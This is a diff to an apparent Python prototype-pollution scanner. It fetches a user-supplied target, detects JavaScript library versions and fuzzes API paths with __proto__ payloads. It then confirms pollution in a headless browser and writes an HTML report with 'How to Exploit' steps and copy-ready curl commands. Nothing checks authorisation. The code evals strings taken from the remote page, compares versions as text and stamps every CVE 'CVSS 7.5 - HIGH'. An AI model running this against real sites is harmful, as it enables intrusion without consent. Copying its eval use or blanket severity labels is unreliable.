@@ -1,8 +1,13 @@
+from colorama import init, Fore, Style
+init(autoreset=True)
+
 import requests, re, os, uuid
 from urllib.parse import urljoin, urlencode
 from playwright.sync_api import sync_playwright
 from bs4 import BeautifulSoup
 from jinja2 import Template
+from tqdm import tqdm
+from itertools import product
 
 # === CVE MAPPING DATABASE (Simple) ===
 LIB_VULNS = {
@@ -34,7 +39,7 @@ HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
+<meta charset=\"UTF-8\">
 <title>Prototype Pollution Scanner Report</title>
 <style>
 body { font-family: sans-serif; background: #111; color: #eee; padding: 20px; }
@@ -64,7 +69,7 @@ function copyToClipboard(text) {
 {% for lib in libs %}
   <li><code>{{ lib.name }} {{ lib.version }}</code>
   {% if lib.vulnerable %}
-    <span class="vuln">(Vulnerable - {{ lib.cves | join(', ') }})</span>
+    <span class=\"vuln\">(Vulnerable - {{ lib.cves | join(', ') }})</span>
   {% endif %}
   </li>
 {% endfor %}
@@ -73,7 +78,7 @@ function copyToClipboard(text) {
 <h2>🚨 Confirmed Polluted Properties</h2>
 {% if polluted %}
   <ul>{% for prop in polluted %}
-    <li class="success"><code>{{ prop }}</code></li>
+    <li class=\"success\"><code>{{ prop }}</code></li>
   {% endfor %}</ul>
 {% else %}
   <p>No prototype pollution detected in runtime.</p>
@@ -81,9 +86,9 @@ function copyToClipboard(text) {
 
 <h2>🧪 Payloads Used</h2>
 {% for payload in payloads %}
-<div style="margin-bottom: 12px;">
+<div style=\"margin-bottom: 12px;\">
   <pre>{{ payload | tojson }}</pre>
-  <button onclick="copyToClipboard(`curl -X POST '{{ target }}/api/config' -H 'Content-Type: application/json' -d '{{ payload | tojson }}'`)">📋 Copy curl</button>
+  <button onclick=\"copyToClipboard(`curl -X POST '{{ target }}/api/config' -H 'Content-Type: application/json' -d '{{ payload | tojson }}'`)\">📋 Copy curl</button>
 </div>
 {% endfor %}
 
@@ -92,11 +97,11 @@ function copyToClipboard(text) {
 <pre>
 Vulnerability: Prototype Pollution via {{ lib.name }}
 
-CVE(s): {% for cve in lib.cves %}{{ cve }} [<span style="color:#ff9933;">CVSS 7.5 - HIGH</span>]{% if not loop.last %}, {% endif %}{% endfor %}
+CVE(s): {% for cve in lib.cves %}{{ cve }} [<span style=\"color:#ff9933;\">CVSS 7.5 - HIGH</span>]{% if not loop.last %}, {% endif %}{% endfor %}
 Detected Version: {{ lib.version }}
 
 Description:
-{{ lib.name }} versions {{ lib.version }} allow attackers to modify the global Object prototype by injecting keys like "__proto__" or "constructor.prototype" into deeply merged inputs.
+{{ lib.name }} versions {{ lib.version }} allow attackers to modify the global Object prototype by injecting keys like \"__proto__\" or \"constructor.prototype\" into deeply merged inputs.
 
 How to Exploit:
 1. Inject this payload into a vulnerable API:
@@ -115,12 +120,12 @@ Impact:
 
 Mitigation:
 - Upgrade {{ lib.name }} to patched version
-- Sanitize inputs: block ["__proto__", "constructor", "prototype"]
+- Sanitize inputs: block [\"__proto__\", \"constructor\", \"prototype\"]
 - Use secure libraries for deep object manipulation
 
 CVE References:
 {% for cve in lib.cves %}
-- <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ cve }}" target="_blank">{{ cve }}</a>
+- <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ cve }}\" target=\"_blank\">{{ cve }}</a>
 {% endfor %}
 </pre>
 {% endfor %}
@@ -138,8 +143,6 @@ Immediate remediation is strongly advised. Update affected libraries, sanitize i
 </html>
 """
 
-
-
 # === SCRIPT PARSER TO DETECT VULNERABLE LIBRARIES ===
 def detect_js_libs(page_source):
     soup = BeautifulSoup(page_source, "html.parser")
@@ -151,33 +154,36 @@ def detect_js_libs(page_source):
                 if lib in src:
                     match = re.search(r"(\d+\.\d+\.\d+)", src)
                     version = match.group(1) if match else "unknown"
-                    vuln = any(eval(f"'{version}' {op} '{v}'") for v in LIB_VULNS[lib]["versions"] for op in ["<"])
+                    vuln = any(eval(f"'{version}' < '{v}'") for v in LIB_VULNS[lib]["versions"])
                     detected.append({
                         "name": lib,
                         "version": version,
                         "vulnerable": vuln,
-                        "cves": LIB_VULNS[lib]["cves"] if vuln else []
+                        "cves": LIB_VULNS[lib]["cves"] if vuln else [],
+                        "payloads": LIB_VULNS[lib]["payloads"] if vuln else []
                     })
     return detected
 
 # === FUZER ===
 def send_payloads(target, payloads):
-    for path in FUZZ_PATHS:
+    payload_jobs = list(product(FUZZ_PATHS, payloads, METHODS))
+    print(f"{Fore.MAGENTA}[*] Launching payload fuzzing on target endpoints...")
+
+    for path, payload, method in tqdm(payload_jobs, desc="Fuzzing payloads", colour="green"):
         url = urljoin(target, path)
-        for payload in payloads:
-            for method in METHODS:
-                try:
-                    if method == "GET":
-                        r = requests.get(url, params=payload, timeout=5)
-                    else:
-                        r = requests.post(url, json=payload, headers=HEADERS, timeout=5)
-                    print(f"[+] {method} {r.url} -> {r.status_code}")
-                except Exception as e:
-                    print(f"[!] {method} {url} failed: {e}")
+        try:
+            if method == "GET":
+                r = requests.get(url, params=payload, timeout=5)
+            else:
+                r = requests.post(url, json=payload, headers=HEADERS, timeout=5)
+            print(f"{Fore.GREEN}[+] {method} {r.url} -> {r.status_code}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] {method} {url} failed: {e}")
 
 # === RUNTIME CONFIRMATION ===
 def browser_check(target):
     polluted = []
+    print(f"{Fore.MAGENTA}[*] Launching browser to confirm runtime pollution...")
     with sync_playwright() as p:
         browser = p.chromium.launch(headless=True)
         page = browser.new_page()
@@ -187,15 +193,17 @@ def browser_check(target):
                 () => {
                     let found = [];
                     for (let k in {}) {
-                        if (['polluted'].includes(k)) found.push(k);
+                        if (["polluted"].includes(k)) found.push(k);
                     }
                     return found;
                 }
             """)
             if keys:
-                polluted.extend(keys)
+                for k in keys:
+                    print(f"{Fore.CYAN}[+] Found polluted property: {Fore.LIGHTGREEN_EX}{k}")
+                    polluted.append(k)
         except Exception as e:
-            print(f"[!] Browser error: {e}")
+            print(f"{Fore.RED}[!] Browser error: {e}")
         finally:
             browser.close()
     return polluted
@@ -206,29 +214,31 @@ def write_report(target, libs, polluted, payloads):
     html = Template(HTML_TEMPLATE).render(target=target, libs=libs, polluted=polluted, payloads=payloads)
     with open(fname, "w") as f:
         f.write(html)
-    print(f"[+] HTML report written: {fname}")
+    print(f"{Fore.LIGHTBLUE_EX}[+] HTML report written: {fname}")
     os.startfile(fname) if os.name == 'nt' else os.system(f"open {fname}")
 
 # === MAIN ===
 if __name__ == "__main__":
-    print("==🧠 Prototype Pollution CVE+Payload Scanner==")
+    print(f"{Fore.CYAN}==🧠 Prototype Pollution CVE+Payload Scanner==")
     target = input("Enter target URL (e.g., https://example.com): ").strip()
     if not target.startswith("http"):
         target = "http://" + target
 
-    # Get HTML source and detect libs
+    print(f"{Fore.YELLOW}[*] Fetching target homepage...")
     try:
         r = requests.get(target, timeout=10)
         libs = detect_js_libs(r.text)
+        for lib in libs:
+            if lib["vulnerable"]:
+                print(f"{Fore.YELLOW}[+] Detected JS library: {lib['name']} {lib['version']} ({Fore.RED}VULNERABLE{Fore.YELLOW})")
     except Exception as e:
-        print(f"[!] Failed to fetch target: {e}")
+        print(f"{Fore.RED}[!] Failed to fetch target: {e}")
         libs = []
 
-    # Gather payloads
     all_payloads = []
     for lib in libs:
         if lib["vulnerable"]:
-            all_payloads.extend(LIB_VULNS[lib["name"]]["payloads"])
+            all_payloads.extend(lib["payloads"])
 
     if not all_payloads:
         all_payloads = [
@@ -237,11 +247,6 @@ if __name__ == "__main__":
             {"__proto__.polluted": "true"}
         ]
 
-    # Send payloads to common paths
     send_payloads(target, all_payloads)
-
-    # Confirm pollution
     polluted_props = browser_check(target)
-
-    # Report
     write_report(target, libs, polluted_props, all_payloads)
